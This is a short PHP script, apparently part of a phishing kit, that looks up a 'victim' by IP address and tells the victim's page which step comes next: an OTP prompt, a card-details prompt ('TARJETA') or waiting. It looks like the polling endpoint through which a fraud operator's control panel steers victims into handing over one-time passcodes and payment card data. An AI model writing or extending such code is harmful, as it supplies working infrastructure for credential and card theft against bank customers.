<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];

// Esta función debe devolver qué paso sigue (OTP, Tarjeta, etc.)
$estado = consultar_estado_victima($ip); 

if ($estado == "OTP") { echo "OTP"; }
elseif ($estado == "TARJETA") { echo "TARJETA"; }
else { echo "ESPERANDO"; }
?>
